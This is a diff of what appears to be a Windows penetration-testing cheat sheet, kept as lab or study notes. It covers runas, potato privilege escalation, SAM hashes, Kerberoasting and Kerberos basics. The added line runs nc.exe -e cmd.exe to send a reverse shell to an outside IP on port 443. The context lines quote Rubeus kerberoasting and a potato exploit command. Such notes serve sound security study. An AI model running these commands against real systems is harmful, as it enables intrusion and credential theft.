@@ -12,6 +12,7 @@ net users
 net user /domain [username]   # check domain group of the user
 -------------------------Run As----------------------------
 runas /netonly /user:[username] cmd	# run cmd as another user (even if they dont exists)
+runas /env /profile /user:DVR4\Administrator "C:\users\viewer\nc.exe -e cmd.exe 192.168.49.169 443 # useful when ssh not working
 Import-module invoke-runascs.ps1        # https://github.com/antonioCoco/RunasCs
 Invoke-RunasCs [username] [password] [cmd]
 -------------------------Add user--------------------------
@@ -48,8 +49,7 @@ potato86.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\windows\s
 ### SAM (Security Account Manager)
 
 A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS)\
-Passwords are LM & NTLM hashed\
-
+Passwords are LM & NTLM hashed\\
 
 ```
 Default file location: 
@@ -235,11 +235,9 @@ Foreach($obj in $Result)
 Rubeus.exe kerberoast /nowrap
 ```
 
-
-
 ## Microsoft authentication protocols
 
-1. LANMAN (LAN Manager)&#x20;
+1. LANMAN (LAN Manager)
 2. NTLM (New Technology LAN Manager) v1, v2
 3. Kerberos
 
@@ -259,4 +257,3 @@ It is a ticket used to authenticated and access to specific service.
 1. **Username & timestamp** encrypted with the **user session** received earlier along with the **TGT** and the **SPN** of the service are required to be sent to the KDC to request for a TGS.
 2. The KDC will return with a **TGS** and a **Service Session Key.**
 3. To authenticate to the service, user need to send their **Username & Timestamp** and their **TGS** to the service.
-
